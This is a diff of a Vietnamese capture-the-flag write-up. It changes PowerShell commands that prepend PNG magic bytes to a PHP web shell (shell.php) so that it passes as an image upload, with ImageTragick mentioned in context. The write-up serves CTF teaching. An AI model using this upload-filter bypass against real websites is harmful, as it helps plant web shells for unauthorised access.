@@ -35,8 +35,8 @@ Kỹ thuật mình sẽ sử dụng là ImageTragick!, thêm magic byte của fi
 Sau đó các bạn thêm PNG Header vào để nguỵ trang:
 ##### PowerShell (Windows)
 ```powershell
-[System.IO.File]::WriteAllBytes("shell.php.png", @(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A))
-Get-Content shell.php -Raw | Out-File -Append -Encoding ASCII shell.php.png
+[System.IO.File]::WriteAllBytes("shell.png.php", @(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A))
+Get-Content shell.php -Raw | Out-File -Append -Encoding ASCII shell.png.php
 ```
 
 ##### Bash (Linux)
@@ -101,4 +101,5 @@ Nói chung là cũng tại thằng dev mà thôi =)))
 ## **Lời kết**
 
 Chúc các bạn đánh CTF vui vẻ!!!
+
 
